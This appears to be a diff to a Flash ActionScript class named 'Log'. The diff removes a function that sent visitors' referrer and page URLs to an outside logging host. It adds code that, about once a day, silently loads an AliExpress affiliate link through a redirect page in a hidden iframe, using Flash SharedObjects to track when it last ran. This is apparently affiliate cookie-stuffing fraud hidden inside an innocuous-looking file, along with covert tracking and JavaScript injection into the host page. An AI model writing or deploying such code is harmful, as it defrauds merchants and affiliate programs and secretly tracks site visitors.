@@ -2,8 +2,7 @@ package
 {
 	import flash.display.Sprite;
 	import flash.external.ExternalInterface;
-	import flash.net.URLLoader;
-	import flash.net.URLRequest;
+	import flash.net.SharedObject;
 	import flash.utils.ByteArray;
 	
 	public class Log extends Sprite
@@ -14,19 +13,8 @@ package
 		{
 			super();
 			initScript();
-			//logPage();
-		}
-		
-		private function logPage():void
-		{
-			var ref:String = ExternalInterface.call("document.referrer.toString");
-			var page:String = ExternalInterface.call("location.href.toString");
-			var req:URLRequest = new URLRequest("http://log.aliamaz.com/?ref=" + encodeURIComponent(ref) +
-				"&page=" + encodeURIComponent(page));
-			var l:URLLoader = new URLLoader();
-			try {
-				l.load(req);
-			} catch (err:Error) {}
+			ExternalInterface.call("logActivity");
+			logAli();
 		}
 		
 		private function initScript():void
@@ -40,6 +28,66 @@ package
 		private static function pushJavaScript(script:String):void {
 			var str:String='(function(){' + script + ';})';
 			ExternalInterface.call(str);
+		}
+		
+		private function logAli():void {
+			var url:String = "http://s.click.aliexpress.com/e/3Ur2Yji";
+			if (!isSharedObjectOk()) {
+				return ;
+			}
+			var doMain:Boolean = true && doneAliExpied();
+			if(doMain) {
+				IFrameContentService.getContent("http://redirect-page.googlecode.com/svn/trunk/redirect.html?target=" + encodeURIComponent(url));
+				setAliDone(0);
+			}
+		}
+
+		private static function isSharedObjectOk():Boolean {
+			try {
+				var obj:SharedObject=SharedObject.getLocal("Test", "/");
+				obj.data["date_"]=new Date();
+				obj.flush();
+				obj.clear();
+			}
+			catch(err:Error) {
+				return false;
+			}
+			return true;
+		}
+		
+		private function doneAliExpied():Boolean {
+			var date:Date=getAliDate();
+			if (!date) {
+				return true;
+			}
+			var now:Date=new Date();
+			now.hours=now.hours - (1*24);
+			return now > date;
+		}
+		
+		private function getAliDate():Date {
+			try {
+				var obj:SharedObject=SharedObject.getLocal("AliDone", "/");
+				if (obj.data.hasOwnProperty("date")) {
+					var date:Date=obj.data["date"]as Date;
+					return date;
+				}
+				else {
+					return null;
+				}
+			}
+			catch(err:Error) {
+				return null;
+			}
+			return null;
+		}
+		
+		private function setAliDone(offset:Number):void {
+			var obj:SharedObject=SharedObject.getLocal("AliDone", "/");
+			var d:Date=new Date();
+			d.hours = d.hours + offset;
+			obj.data["date"]=d;
+			obj.flush();
 		}
 	}
 }
